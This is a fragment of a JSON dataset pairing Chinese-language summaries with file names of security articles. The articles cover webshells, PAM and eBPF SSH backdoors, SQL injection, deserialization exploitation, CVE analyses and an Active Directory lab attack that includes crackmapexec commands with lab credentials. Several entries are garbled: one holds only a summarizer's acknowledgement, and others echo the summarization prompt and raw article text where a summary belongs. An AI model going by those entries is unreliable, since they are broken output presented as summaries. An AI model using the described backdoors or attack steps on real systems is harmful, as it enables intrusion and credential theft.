        "page_content": "**主题：** WebSocket 内存马，一种新型内存马技术\n\n**内容：** WebSocket 内存马是一种利用 WebSocket 全双工通信协议实现的内存马，它可以在服务启动后动态添加，无需注册新的监听器或 servlet。该技术可以用于代理，连接不出网主机上的反序列化漏洞，并通过修改 webshell 管理工具来支持 ws 协议。",
        "FileName": "11549-WebSocket 内存马，一种新型内存马技术.pdf"
    },
    {
        "page_content": "该文档分析了 Linux Pam 后门的主题和内容，包括种植过程、改进和优化方法，以及利用 Pam_permit.so 和同形异义字 Unicode 字符进行后门植入的技巧。此外，还讨论了使用数据带外方法收集凭证和劫持 pam_get_item 函数来获取密码。",
        "FileName": "7902-Linux Pam后门总结拓展.pdf"
    },
    {
        "page_content": "本文探讨了在 MySQL 中使用位运算高效获取 SQL 盲注数据的技术。通过位左移和位右移操作，可以将 8 位二进制 ASCII 码的每一位移动到最后一位，并通过判断运算结果是否为 0 或 1 来确定字符。这种方法比二分法发送更少的请求，并且在时间盲注的情况下可以使用多线程同时发送数据包。",
        "FileName": "9302-关于高效的SQL盲注-位运算的二次探究.pdf"
    },
    {
        "page_content": "                    好的，我明白了。我将只生成文档的主题。",
        "FileName": "7169-对MYSQL注入相关内容及部分Trick的归类小结.pdf"
    },
    {
        "page_content": "本文档介绍了 PHP-Parser 库，该库用于简化静态代码分析和操作。它提供了创建解析器实例、解析 PHP 脚本为抽象语法树 (AST) 以及格式化代码等功能。此外，文档还介绍了 PhpParser\\NodeTraverser，它允许遍历每个 AST 节点，并提供了几个示例来解析字符串、函数和类成员方法。最后，文档展示了如何使用 PHP-Parser 和 PHP 代码混淆技术来加密和解密 PHP 脚本。",
        "FileName": "8165-初探PHP-Parser和PHP代码混淆.pdf"
    },
    {
        "page_content": "本文介绍了基于资源的约束委派（RBCD）的本地权限提升方法，该方法在安装了许多应用程序的多用户系统（如 Citrix）上很常见。作者详细描述了漏洞背后的原理，以及在 Cobalt Strike 中操作化该漏洞的复杂细节，包括网络枢纽和代理的配置。通过 Cobalt Strike Beacon 和 LDAP 中继攻击，攻击者可以提升员工工作站的权限，模拟任何用户对受害计算机进行攻击。",
        "FileName": "12704-红队权限提升-基于RBCD的权限提升-第2部分.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 Busqueda Linux 机器进行渗透测试的步骤，该机器涉及利用 Python 模块中的漏洞、使用 fuzz 攻击和命令注入技术，以及横向移动到其他系统。通过分析源代码、使用 docker 容器和检查系统脚本，渗透测试人员能够获得对机器的访问权限并执行任意代码。",
        "FileName": "12812-hackthebox Busqueda 2种方法立足.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，其中发现了git源码泄露、开放的ssh和ftp端口，以及一个存在SQL注入漏洞的参数提交点。通过代码审计，测试人员发现了可以上传.htaccess文件但无法解析的kcfinder，以及一个可以写入pluginconfig.php文件并绕过过滤的fwrite函数。利用这些漏洞，测试人员获得了账号密码并成功上传蚁剑，实现了getshell。",
        "FileName": "9152-一次打点测试.pdf"
    },
    {
        "page_content": "该文档分析了 MySQL JDBC 连接器中从 JDBC 攻击到 detectCustomCollations 利用范围的扩展，重点关注了 ServerStatusDiffInterceptor 和 detectCustomCollations 属性在利用链中的作用，并讨论了不同 MySQL 版本中利用的可用性和限制。",
        "FileName": "11610-从JDBC attack到detectCustomCollations利用范围扩展.pdf"
    },
    {
        "page_content": "该文档探讨了 JNDI 漏洞利用的两个问题：如何一次请求多个 JNDI Bypass 利用链，以及如何自动检测反序列化利用链。作者提出了一种利用 RegistryContextFactory 类和 RMI 协议来解决第一个问题的方法，并分析了 StreamRemoteCall#executeCall 中反序列化过程，提出了一种通过 DNSLog 判断利用链是否存在的方法来解决第二个问题。",
        "FileName": "10845-JNDI漏洞利用探索.pdf"
    },
    {
        "page_content": "该文档分析了 WordPress 核心框架 WP_Query 中的 SQL 注入漏洞 (CVE-2022-21661)，该漏洞允许攻击者通过可控数据触发 SQL 注入，从而获取敏感信息或执行恶意操作。",
        "FileName": "10841-某Press核心框架WP_Query SQL注入漏洞分析（CVE-2022–21661）.pdf"
    },
    {
        "page_content": "该文档分析了 Java 安全中 C3P0 反序列化的利用手法，包括 URLClassLoader 链、BeanFactory 不出网 RCE、WrapperConnectionPoolDataSource 类不出网利用和 Fastjson 之 WrapperConnectionPoolDataSource 类不出网利用。文档详细介绍了每个利用链的原理、代码实现和 POC 编写，为理解和利用 Java 安全中的 C3P0 反序列化漏洞提供了详细的参考。",
        "FileName": "11894-Java安全中C3P0反序列化在各个链子中的利用手法(不出网fastjson等等).pdf"
    },
    {
        "page_content": "该文档分析了 Laravel Debug RCE 漏洞，该漏洞影响 Ignition <2.5.2 版本。攻击者可以通过构造恶意 HTTP 请求，利用 ExecuteSolution 路由动态执行恶意 Solution，从而在服务器上执行任意代码。漏洞利用了 Ignition 中的 Solution 类，该类允许通过 file_get_contents() 读取文件内容，并通过 file_put_contents() 保存文件内容。攻击者利用 php://filter 过滤器对文件内容进行操作，将恶意代码写入服务器上的日志文件，然后通过 php://filter 过滤器读取日志文件，去掉垃圾字符，还原恶意代码，最终触发 phar 反序列化，实现远程代码执行。",
        "FileName": "9165-Laravel Debug RCE分析.pdf"
    },
    {
        "page_content": ".NET Remoting 是一种在不同进程间传递对象的机制，它支持通过 HTTP、TCP 和 IPC 协议传输对象。本文重点介绍了使用 HTTP 协议的 .NET Remoting，并通过示例代码演示了如何创建远程对象、注册服务和调用远程方法。此外，本文还讨论了 .NET Remoting 中 TypeFilterLevel 属性的重要性，并提供了利用该属性进行攻击的示例。",
        "FileName": "9605-.net反序列化之.net remoting.pdf"
    },
    {
        "page_content": "**主题：** 一次艰难的提权经历\n\n**内容：** 作者描述了一次艰难的提权经历，涉及文件上传漏洞、哥斯拉工具、MSF 反弹 shell、SUID 提权、CVE-2021-4034 漏洞、脏牛提权脚本和 Polkit 提权。作者最终通过 Polkit 提权成功获取 root 权限，并获取了宝塔面板的密码 hash。",
        "FileName": "11086-记一次艰难的提权.pdf"
    },
    {
        "page_content": "本文档分析了智能合约反汇编代码，重点关注代码逻辑。它通过分析反汇编指令，展示了如何从反汇编代码中推导出智能合约源代码的逻辑，包括判断函数是否存在转账操作、调用内部函数并赋值、以及计算返回值等过程。",
        "FileName": "8704-智能合约安全系列文章反汇编·下篇.pdf"
    },
    {
        "page_content": "该文档重点介绍了利用公众号商城服务中的漏洞进行“一分钱购物”的流程。该漏洞允许攻击者通过修改数据包中的金额字段，将商品价格修改为 0.01 元，从而以极低的价格购买商品。该流程涉及登录公众号商城、选择商品、抓取数据包、修改金额字段、提交订单和完成支付。文档强调了支付漏洞的严重性，并建议企业加强支付系统监控和用户认证措施以保障支付安全。",
        "FileName": "12428-记一次公众号商城服务1分钱购物漏洞.pdf"
    },
    {
        "page_content": "CVE-2020-5902 漏洞利用 F5 BIG-IP 中的 URL 解析差异性、请求处理追溯和后端代码逻辑，导致未授权用户可远程执行任意 Java 代码，进而控制 F5 BIG-IP 的全部功能，包括执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。",
        "FileName": "8008-CVE-2020-5902F5 BIG-IP RCE分析研究.pdf"
    },
    {
        "page_content": "该文档详细描述了作者如何通过分析泄露的源码，从数据库信息泄露和后台管理员密码泄露入手，最终利用模板引擎禁用的函数漏洞，成功在目标网站上获取了 getshell 权限。",
        "FileName": "10692-记一次从源码泄露到getshell.pdf"
    },
    {
        "page_content": "本文档探讨了基于 eBPF 的 SSH 后门，它利用 eBPF 的特性在不修改原始文件的情况下以动态插桩的方式实现 SSH 密码记录和万能密码后门。通过跟踪和插桩，该后门可以记录 SSH 用户名和密码，并通过修改 strcmp 函数的参数来绕过认证，实现万能密码后门。",
        "FileName": "10564-基于eBPF的SSH后门.pdf"
    },
    {
        "page_content": "在一次渗透测试中，研究人员通过获取网站源码发现该系统使用 OSS 进行文件存储，但无法获取 shell。通过查询阿里云相关文档，研究人员发现可以使用阿里云 RDS 的 ACCESSKEY 来操作 RDS 实例。通过使用 Rdscli 工具，研究人员可以查看 RDS 实例信息，申请外网地址，修改安全组和 IP 白名单，从而获得 RDS 的外网域名和访问权限，最终成功获取 shell。",
        "FileName": "8451-云上渗透-RDS数据库攻防.pdf"
    },
    {
        "page_content": "该文档记录了一次实战代码审计过程，发现了三个漏洞：任意文件读取、后台 RCE 和任意文件上传。通过全局搜索和分析代码，审计人员发现了这些漏洞，并提供了漏洞验证方法。",
        "FileName": "12563-记一次实战代码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了从外网打点到内网横向渗透，最终获取整个内网权限的过程，涉及各种内网穿透技术、Cobalt Strike 在内网中的横向移动方法、手工编写 exp 获取边界突破点进入内网的方法，以及行业流行的内网渗透测试方法。",
        "FileName": "11432-域渗透之外网打点到三层内网.pdf"
    },
    {
        "page_content": "Thinkphp5.1POP 漏洞利用涉及构造一个反序列化漏洞入口，通过对 Windows 类和 Conversion 类的追踪，发现可以通过 Pivot 类将这两个类关联起来，从而触发 Conversion 中的 __toString 方法。利用 Request 类中的 __call 方法和 hook 机制，将可控参数传递给 filterValue 方法，最终执行危险函数。POC 构造包括关联 Windows 和 Conversion 类、设置 Model 中的 append 和 data 属性、设置 Request 中的 hook 和 filter 属性，以及序列化 Windows 对象作为 POST 传参。",
        "FileName": "12457-Thinkphp5.1POP追踪及POC编写(详).pdf"
    },
    {
        "page_content": "该文档讨论了绕过一次命令执行漏洞的方法，重点介绍了使用特殊字符替换、分隔符绕过和管道符构造 payload 等技术。作者通过测试和示例说明了这些方法，并强调了通过搜索响应中的关键字来识别问题的重要性。",
        "FileName": "9734-一次命令执行漏洞的绕过之我是菜逼.pdf"
    },
    {
        "page_content": "该文档介绍了在 SQL Server 中利用中文路径编写 Webshell 的方法，包括使用 PowerShell 上线、BAT 文件写 shell、手动写 shell 和 certutil 下载上线等技术。文档重点讨论了由于 MSSQL 调用 cmd 使用 GB2312 编码而导致的中文路径问题，并提供了相应的解决方案，如使用 UTF-8 解码和 GB2313 编码。",
        "FileName": "10375-SQLserver写Webshell总结-突破中文路径.pdf"
    },
    {
        "page_content": "该文档分析了基于 ThinkPHP3.2.2 框架开发的 CMS 系统中的 SQL 注入漏洞。它重点关注 App 文件夹中的文件，发现前台 UserController.class.php 中的 do_name() 方法存在注入漏洞，而后台 PhotoController.class.php 中的 ID 参数也存在注入漏洞。文档还提供了在线解密网站以解密后台文件，并参考了其他资源以了解 ThinkPHP3.2.2 中注入漏洞的原理。",
        "FileName": "9042-某CMS注入审计.pdf"
    },
    {
        "page_content": "本文深入探讨了 GNUC++ 异常处理机制，包括异常处理帧结构、__gxx_personality_seh0 函数对 Language-specific handler data 数据的解析过程，以及异常处理流程中异常搜索和清理阶段的实现细节。",
        "FileName": "11525-CPP 异常处理机制初探.pdf"
    },
    {
        "page_content": "文档分析了 BossCms V2.2 源代码中的两个漏洞：一个 DOM 型 XSS 漏洞，可通过在 URL 中添加特定字符串触发；另一个是逻辑缺陷，可通过更改后台路径来覆盖前台文件并删除后台登录文件。",
        "FileName": "12796-BossCms V2.2 代码审计.pdf"
    },
    {
        "page_content": "该文档分析了信呼 OA 系统中的任意 PHP 文件包含漏洞，该漏洞允许攻击者通过控制 `$_GET['m']` 和 `$_GET['surl']` 参数来读取任意 PHP 文件。攻击者可以通过构造一个包含恶意 PHP 代码的 URL 来利用此漏洞，从而在目标服务器上执行任意代码。",
        "FileName": "10574-西湖论剑-信呼oa审计复盘.pdf"
    },
    {
        "page_content": "本文档重点介绍了 PHP 反序列化漏洞的各种利用方式，包括 __wakeup() 魔法函数绕过、PHP session 反序列化、phar 反序列化、POP CHAIN、SoapClient 搭配 CRLF 注入实现 SSRF、Exception + 反序列化导致 XSS 等。这些漏洞利用技巧涉及 PHP 序列化机制、对象属性操作、魔术方法调用、类之间的关联、伪协议读取、SSRF 攻击和 XSS 攻击等技术。",
        "FileName": "7570-从CTF中学习PHP反序列化的各种利用方式.pdf"
    },
    {
        "page_content": "本文档介绍了如何修改蚁剑源码以添加 ASP/ASPX 解码模块，实现 ASP/ASPX 加密回显。作者通过分析蚁剑源码结构，修改解码器 UI 和核⼼模板，并添加了 asenc 函数，使 ASP/ASPX 脚本的返回流量也能进行加密传输。",
        "FileName": "7736-蚁剑改造过WAF系列（二）.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了 SQL 注入的各种技术，包括联合注入、group_concat、from information_schema.tables、报错注入、读写文件和联动 sqlmap。它提供了丰富的示例和技巧，帮助渗透测试人员有效地利用 SQL 注入漏洞获取敏感信息和控制系统。",
        "FileName": "9268-再谈注入.pdf"
    },
    {
        "page_content": "CVE-2019-11076 漏洞分析涉及 Cribl UI 1.5.0 中未授权命令执行漏洞，该漏洞允许攻击者通过伪造 JWT 令牌来绕过身份验证并执行任意命令。漏洞的根源在于硬编码的密钥，允许攻击者生成有效的令牌并获得对系统的未授权访问。后续版本通过从配置文件中读取密钥来修复了该漏洞，但如果开发者在生产环境中不更改默认密钥，则仍然存在未授权 RCE 的风险。",
        "FileName": "7139-CVE-2019-11076 Cribl UI 1.5.0 未授权命令执行漏洞分析.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n                    **文档内容：**\n                    ```\n                    1.登录 安洵杯 2021  官⽅ Writeup(Re|Pwn) - D0g3 安洵杯 2021  官⽅ Writeup(Re|Pwn) - D0g3 LaNyer   /  2021-12-03 23:20:31  /  浏览数  5957 本⽂由   @D0g3   编写 i-SOON_CTF_2021  部分题⽬环境 / 源码后续将在 Github 开源 项⽬地址 考点： smc+ 花指令 + 数组内异或 +W 型的栅栏加密 ( ⽐较难看 )+ 魔改 xxtea 。 32 位程序，⽆壳，打开发现是⽆法吃到⻝物的贪吃蛇游戏， ida 打开， shift 12 可以看到⼀些关键字符串，但是⽆法交叉引⽤。 定位到 main 函数，发现 sub_40100F 函数有花，点进去看看。 去花后，发现就是对 0x401D10 地址开始的后 0x256 个字节进⾏异或 0x37 解密。 所以两个⽅法，⼀是直接动调⾃解密，⼆是直接 idapython 还原静态分析，实际上动调会更好，确保堆栈平衡的情况下在 0x401D10 直接 set ip 动调分析，下⾯也给⼀个 idapython 还原脚本。 RE sign_inimport \t idc \t\t\t\t st \t = \t 0x401D10 \t\t\t\t i \t = \t 0 \t\t\t\t while \t st \t <= \t 0x401D10 + 0x245 : \t\t\t\t\t\t\t\t value \t = \t ida_bytes . get_byte ( st ) \t\t\t\t\t\t\t\t value \t ^= \t 55 \t\t\t\t\t\t\t\t ida_bytes . patch_byte ( st , \t value ) \t\t\t\t\t\t\t\t st \t += \t 1 接下来分析 0x401D10 函数。 ⾄于 rand()%256 的由来在这，也就是⻝物的判断，当⻝物等于 rand()%256 时才会进⼊输⼊ flag 的函数。然后解题就先爆破 256 可能，得到 food==77 是正确的，然后进⾏ W 型栅栏解密，实际上看不懂也没关系，直接测试 flag ，得到变换 顺序，只不过由于前⾯有个数组内异或，所以可能会造成多义性，所以动调时，跳过数组内异或就⾏。 enc = [ 0x00000061 , \t 0x00000067 , \t 0x0000006D ,\n2.是正确的，然后进⾏ W 型栅栏解密，实际上看不懂也没关系，直接测试 flag ，得到变换 顺序，只不过由于前⾯有个数组内异或，所以可能会造成多义性，所以动调时，跳过数组内异或就⾏。 enc = [ 0x00000061 , \t 0x00000067 , \t 0x0000006D , \t 0x00000073 , \t 0x00000079 , \t 0x00000035 , \t 0x00000062 , \t 0x00000066 , \t\t\t\t\t\t\t\t 0x00000068 , \t 0x0000006C , \t 0x0000006E , \t 0x00000072 , \t 0x00000074 , \t 0x00000078 , \t 0x0000007A , \t 0x00000034 , \t\t\t\t\t\t\t\t 0x00000036 , \t 0x00000063 , \t 0x00000065 , \t 0x00000069 , \t 0x0000006B , \t 0x0000006F , \t 0x00000071 , \t 0x00000075 , \t\t\t\t\t\t\t\t 0x00000077 , \t 0x00000031 , \t 0x00000033 , \t 0x00000064 , \t 0x0000006A , \t 0x00000070 , \t 0x00000076 , \t 0x00000032 ] \t\t\t\t flag = 'abcdefghijklmnopqrstuvwxyz123456' \t\t\t\t for \t i \t in \t flag : \t\t\t\t\t\t\t\t print ( chr ( enc . index ( ord ( i )), end = \"\" ) \t\t\t\t #index=[0,6,17,27,18,7,1,8,19,28,20,9,2,10,21,29,22,11,3,12,23,30,24,13,4,14,25,31,26,15,5,16] 解题脚本。unsigned \t int \t enc [ 32 ] \t = \t { \t\t\t\t\t\t\t\t\t 0xBF8ED8A5 , \t 0xE115A9F9 , \t 0xFCD3F08A , \t 0x8BBF8946 , \t 0xC308B162 , \t 0x2B19CF29 , \t 0x7A770656 , \t 0xA4BAE4BA ,\n3.enc [ 32 ] \t = \t { \t\t\t\t\t\t\t\t\t 0xBF8ED8A5 , \t 0xE115A9F9 , \t 0xFCD3F08A , \t 0x8BBF8946 , \t 0xC308B162 , \t 0x2B19CF29 , \t 0x7A770656 , \t 0xA4BAE4BA , \t\t \t\t\t\t\t\t\t\t 0x4E3E8CE4 , \t 0x01A7E1D9 , \t 0x75E9CE04 , \t 0x22B593B9 , \t 0x497742B4 , \t 0x24EB15F6 , \t 0xF2C2FF0E , \t 0x47973039 , \t \t\t\t\t\t\t\t\t 0xC801CA0D , \t 0x6A125861 , \t 0x80320BE8 , \t 0x0385BD47 , \t 0x69F96DDD , \t 0xE56490D1 , \t 0x2D3CAD4B , \t 0x2D4200BE , \t \t\t\t\t\t\t\t\t 0x89EF6979 , \t 0x4A91885D , \t 0x019DEBC7 , \t 0x3BF8FD96 , \t 0x1BDD2557 , \t 0xB8685FDD , \t 0x57226614 , \t 0x9F585C28 }; \t\t\t\t //abcdefghijklmnopqrstuvwxyz123456\t \t\t\t\t #include <stdio.h> \t\t\t\t #include <math.h> \t\t\t\t int \t main ( void ){ \t\t\t\t\t\t\t\t FILE \t * p ; \t\t\t\t\t\t\t\t char \t v [ 0x3104d ] = { 0 }; \t\t\t\t\t\t\t\t int \t i ; \t\t\t\t\t\t\t\t p = fopen ( \"LOCALIZATION.bin\" , \"rb\" ); \t\t\t\t\t\t\t\t fread ( & v , \t 1 , \t 0x3104d , \t p ); \t\t\t\t\t\t\t\t for ( i = 0 ; \t i \t < \t 0x3104d ; \t i ++ ) \t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t v [ i ] = v [ i ] ^ 65 ; \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t FILE",
        "FileName": "10617-安洵杯2021 官方Writeup(RePwn) - D0g3.pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 Python UAF 漏洞执行任意代码，并提供了漏洞利用的详细步骤。该漏洞利用了 CPython 中 memoryview 对象和 ELF 文件结构，通过伪造 memoryview 对象指向释放的字节数组对象，并利用 id 函数指向其他对象，最终修改 ob_bytes 和 ob_start 的位置，从而读取内存并执行任意代码。",
        "FileName": "11399-一个潜藏10年的Python UAF漏洞.pdf"
    },
    {
        "page_content": "naabu 是 ProjectDiscovery 组织开发的一款开源端口扫描器，它基于 Go 语言编写，支持 SYN 和 Connect 两种扫描模式，并提供多种输入类型支持，包括 HOST/IP/CIDR 表示法。naabu 采用随机化地址扫描算法，可以有效避免被目标网络检测和封锁。它还集成了 CDN 检查功能，可以识别目标 IP 是否属于 CDN 范围。",
        "FileName": "9987-projectdiscover之naabu 端口扫描器源码学习.pdf"
    },
    {
        "page_content": "该文档分析了 VMware vRealize 中的两个漏洞：CVE-2021-21975 和 CVE-2021-21983。CVE-2021-21975 允许通过 SSRF 攻击，而 CVE-2021-21983 允许任意文件上传。文档详细介绍了漏洞的复现步骤，包括利用 SSRF 获取 Authorization 令牌，然后使用该令牌通过文件上传漏洞获取 shell 访问权限。",
        "FileName": "9433-CVE-2021-21975&CVE-2021-21983 VMware vRealize SSRF、任意文件上传漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了house of apple2 house of apple2是一种新的glibc中IO攻击方法，在glibc 2.35好好像仍是堆题的通杀手法，该方法利用了_IO_wfile_overflow函数控制程序执行流，通过伪造IO结构体，劫持_IO_FILE的vtable和_wide_data，利用IO流操作（包括但不限于：从main触发、调用exit、通过__malloc_assert触发）获取libc地址和heap地址，再通过largebin attack劫持_IO_list_all处为我们的可控堆地址，进而劫持_IO_FILE的vtable为_IO_wfile_jumps，以可以调⽤到_IO_wfile_overflow函数即可控制程序的执⾏流。",
        "FileName": "12426-house of apple2 心得体会.pdf"
    },
    {
        "page_content": "该文档详细分析了 VMware Workspace ONE Access 中的 SSTI 远程代码执行漏洞 (CVE-2022-22954)，该漏洞允许攻击者通过精心设计的请求执行任意代码。文档深入探讨了漏洞的触发机制、利用方法以及缓解措施，并提供了利用该漏洞的步骤指南。",
        "FileName": "11196-CVE-2022-22954 VMware Workspace ONE Access SSTI RCE.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 usual*** CMS 8.0 的代码审计，发现了多个漏洞，包括 SQL 注入、盲注、反射型 XSS 和目录删除漏洞。这些漏洞可以通过精心设计的 POC 进行利用，例如通过注入恶意 SQL 语句来获取敏感信息或通过反射型 XSS 攻击来执行任意 JavaScript 代码。",
        "FileName": "8100-usual CMS 8.0代码审计.pdf"
    },
    {
        "page_content": "该文档介绍了一种绕过 360 主机卫士 xss 防护的方法，通过对大于号（>）进行 HTML 实体编码和 URL 编码，并将其添加到 xss payload 中，可以绕过大多数 waf。该方法已在云锁、奇安信 CDN、安全狗、阿里云和百度云加速等 waf 上进行了测试，其中云锁、安全狗和百度云加速可以绕过，而奇安信 CDN 和阿里云则无法绕过。",
        "FileName": "7241-某主机卫士xss绕过.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 Vulnhub 靶机 Vegeta 的渗透测试过程，包括信息收集、目录扫描、图象隐写解密、莫尔斯电码解码和 Linux 提权，最终成功获取了目标系统的 root 权限和 flag。",
        "FileName": "12708-vulnhub打靶日记day01之vegeta.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-31197 漏洞，该漏洞是由于 PostgreSQL JDBC 中 ResultSet.refreshRow() 方法中的 SQL 注入造成的。漏洞利用涉及创建具有特定列名的表，然后使用 refreshRow() 方法执行恶意 SQL 语句，该语句可以闭合列名并执行任意 SQL 代码。修复版本通过对列名进行转义来解决此问题，从而防止它们直接写入 SQL 语句。",
        "FileName": "11660-CVE-2022-31197 PostgreSQL JDBC SQL注入分析.pdf"
    },
    {
        "page_content": "本文分析了 HSQLDB 反序列化漏洞的利用方式，从漏洞挖掘的角度出发，详细介绍了漏洞点的发现、触发路由的梳理、EXP 的构造和 Payload 的生成过程，并通过代码示例演示了漏洞的利用。",
        "FileName": "10227-关于hsqldb反序列化漏洞的一些思考.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用某教育机构网站的漏洞来获取 edu 证书。该漏洞涉及修改 XML 响应包中的值，从而绕过登录验证并访问管理平台。该文档还提供了对不同 URL 路径的探索，揭示了不同的功能点。然而，一些评论者认为该漏洞的利用价值有限，因为无法访问敏感信息或执行未经授权的操作。",
        "FileName": "10028-某edu学校漏洞获得edu证书.pdf"
    },
    {
        "page_content": "该文档介绍了 Linux 系统中的 getdents64 系统调用，该调用用于读取指定目录的目录项信息。它提供了该调用的参数、返回值、功能和目录项信息结构的详细信息。文档还讨论了 OGW（open、getdents64、write）利用技术，该技术使用 getdents64 函数将目录中的文件名读入指定区域。",
        "FileName": "12923-getdents64_ogw手法的利用.pdf"
    },
    {
        "page_content": "本文档探讨了进程注入技术，包括获取目标进程句柄、申请内存、写入进程内存和创建远程线程等步骤。它还提供了示例代码，展示了如何使用 Windows API 函数来实现进程注入。此外，本文档还讨论了 IAT（导入地址表）和静态源码处理等相关主题。",
        "FileName": "11489-进程注入的探索.pdf"
    },
    {
        "page_content": "该文档主要介绍了蓝队基础安全运维防护知识，包括日志分析、事件日志分析、常用工具、应急响应、漏洞修复等内容，旨在帮助蓝队人员提升安全运维防护能力。",
        "FileName": "10197-蓝队基础：安全运维防护浅析.pdf"
    },
    {
        "page_content": "本文探讨了 Java 中 `Runtime.getRuntime().exec` 方法在执行命令时处理特殊字符（如 `&`）的机制。当传入字符串命令时，Java 会对命令进行空格分割，导致特殊字符的语义被破坏。而当传入字符串数组时，Java 会直接调用系统命令解释器（如 `/bin/bash`），从而保留特殊字符的语义。",
        "FileName": "7046-Java Runtime.getRuntime().exec由表及里.pdf"
    },
    {
        "page_content": "该文档分析了微软 Exchange 服务器中的一个远程代码执行漏洞 (CVE-2020-0688)，该漏洞是由 Exchange Server 在安装时未能正确创建唯一的加密密钥造成的。攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在 Exchange 服务器上以 SYSTEM 权限执行任意代码。微软已发布补丁来解决此漏洞，建议 Exchange Server 管理员立即部署该补丁。",
        "FileName": "7299-微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688].pdf"
    },
    {
        "page_content": "该文档主要介绍了如何分析如下文档并完成以下任务：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n                    3. 找出文档中提到的用户和组\n                    4. 找出文档中提到的计算机和网络设备\n                    5. 找出文档中提到的服务和应用程序\n                    6. 找出文档中提到的文件和目录\n                    7. 找出文档中提到的 LSA 秘密\n                    8. 找出文档中提到的注册表项和值\n                    9. 找出文档中提到的网络共享\n                    10. 找出文档中提到的其他信息\n\n文档主题：域渗透 GOAD(Game Of Active Directory) v2  （二） 域渗透 GOAD(Game Of Active Directory) v2  （二） u21h2   /  2023-02-11 10:30:00  /  发表于浙江  /  浏览数  5989 MS14-068 漏洞太⽼了   所以只尝试 samccountname 和 printnightmare 在  2021  年底，当每个⼈都在担⼼  log4j “log4shell”  漏洞时，另⼀个关注较少的漏洞出现了： CVE-2021-42287 。 查理 · 克拉克  (Charlie Clark)  在这⾥对此进⾏了精彩的描述：   https://exploit.ph/cve-2021-42287-cve-2021-42278- weaponisation.html cube0x0  在  Windows  上⾃动进⾏攻击：   https://github.com/cube0x0/noPac 由 shutdown 带来在 linux 上的攻击  :  https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing  ( 仍在 impacket 的 PR 中  :  https://github.com/SecureAuthCorp/impacket/pull/1224 ) 作为  linux  和  exegol  的忠实粉丝，我们将尝试  linux  ⽅式  :) 在这⾥使⽤之前 0x03 中通过 kerberoasting 得到的⽤户 \t north/jon.snow:iknownothing \t 找个 cme 模块查看机器账号配额 cme\tldap\t-L cme\tldap\twinterfell.north.sevenkingdoms.local\t-u\tjon.snow\t-p\tiknownothing\t-d\tnorth.sevenkingdoms.local\t-M \t MAQ 0x05 Exploit with user  使⽤⽤户权限来渗透 SamAccountName (nopac) 查看是否可以添加⽤户( 如果是 docker 启动的 cme 的话   记得在 docker 内也设置 host 的   直接通过 ip ⽆法连接 ldpa 因为 linux 版本的利⽤⼯具还没有合并到 impacket 的主分⽀中   需要进⾏如下操作 git\tclone\thttps://github.com/SecureAuthCorp/impacket\tmyimpacket cd \tmyimpacket git\tcheckout\t-b\tmydev python3\t-m\tvirtualenv\tmyimpacket\t #\t 可省略或者换成 conda source \tmyimpacket/bin/activate\t #\t 可省略或者换成 conda python3\t-m\tpip\tinstall\t. 获取我们想要的等待拉取请求（您可以在  exegol  安装脚本中找到⼤量好的  PR  合并： https://github.com/ShutdownRepo/Exegol- images/blame/main/sources/install.sh#L286 ） git\tfetch\torigin\tpull/1224/head:1224 git\tfetch\torigin\tpull/1202/head:1202 git\tmerge\t 1202 git\tmerge\t 1224 重新排序路径输⼊结果以在  $PATH  中的其他路径之前加载我们的  pyenv bin （这在  zsh  上是必需的，在  bash  中它直接获取我们的 pyenv bin ） rehash 然后尝试如下命令   （   其实不执⾏的话   直接 pyhton examples 应该也可以 enameMachine.py getST.py 我们要做的是添加⼀台计算机，清除那台计算机的 SPN ，重命名成与 DC 同名的计算机，为计算机获取⼀个 TGT\n```",
        "FileName": "12138-域渗透GOAD(Game Of Active Directory) v2 （二）.pdf"
    },
    {
        "page_content": "该文档分析了两个 CSP 绕过挑战，第一个挑战利用 PHP 响应缓冲区大小填充来绕过 HTTP 响应头，第二个挑战利用硬编码的 nonce 值来绕过 CSP 限制，从而执行脚本并获取 flag。",
        "FileName": "9219-两道CSP题目绕过分析.pdf"
    },
    {
        "page_content": "该文档详细描述了利用一系列经典漏洞（包括会话伪造、任意文件上传、条件竞争和文件包含）来实现白盒审计到远程代码执行的攻击过程。",
        "FileName": "9319-记一次跌宕起伏的白盒审计到RCE.pdf"
    },
    {
        "page_content": "Rex 是一个自动化漏洞利用引擎，它基于 QEMU 和 angr，通过混合执行来复现崩溃路径，并根据寄存器及内存信息对漏洞类型/可利用性进行判定，并尝试应用多种漏洞利用技术自动生成利用脚本。它包含三个主要模块：Crash（重现崩溃路径）、Technique（应用利用技术）和 Exploit（生成利用脚本）。Rex 提供了多种漏洞类型，包括 IP 覆盖、寄存器覆盖、任意读写和任意传输。它还实现了多种利用技术，如 shellcode 泄漏地址、寄存器控制和系统调用劫持。",
        "FileName": "7179-Rex 自动化利用引擎分析.pdf"
    },
    {
        "page_content": "本文探讨了 Weblogic 后反序列化漏洞的利用思路，重点关注在反序列化完成后的漏洞触发点。通过分析 CVE-2023-21931 和 CVE-2023-21839 漏洞，文章展示了如何利用 lookup() 方法触发漏洞，并通过 WLNamingManager 类的 getObjectInstance() 方法完成远程 JNDI 加载。",
        "FileName": "12459-Weblogic CVE-2023-21931 漏洞挖掘技巧：后反序列化利用.pdf"
    },
    {
        "page_content": "该文档详细描述了一次渗透测试的完整过程，从发现 SQL 注入漏洞到获取管理员凭据、上传 Webshell、绕过杀毒软件、创建管理员帐户，最后通过内网穿透成功进行远程连接。",
        "FileName": "9500-记一次简单渗透.pdf"
    },
    {
